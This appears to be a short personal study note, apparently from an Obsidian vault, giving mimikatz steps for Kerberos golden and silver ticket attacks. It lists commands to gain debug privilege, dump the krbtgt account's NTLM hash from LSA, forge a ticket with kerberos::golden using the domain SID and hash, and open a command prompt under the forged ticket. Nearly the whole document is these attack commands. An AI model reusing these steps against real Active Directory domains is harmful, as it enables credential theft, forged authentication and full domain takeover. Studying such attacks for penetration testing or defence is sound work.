need mimikatz maow :3
  
privilege::debug
  
lsadump::lsa /inject /name:krbtgt
- this is for golden ticket
- if you are doing silver ticket, replace krbtgt with the service name
  
you need the SID, RID, and NTLM of the account
![[../assets/Golden-Silver Ticket/image 247.png|image 247.png]]
- SID → after Domain:
- RID → open your eyes
- NTLM → use primary
  
Create the golden/silver ticket
- Kerberos::golden /user:<user>/domain:<domain_controller> /sid: /krbtgt: /id:
    
    - golden ticket will be Administrator
    
    - /krbtgt → give it the NTLM
    
![[../assets/Golden-Silver Ticket/image 1 178.png|image 1 178.png]]
  
misc::cmd
- enter an elevated command prompt with the given ticket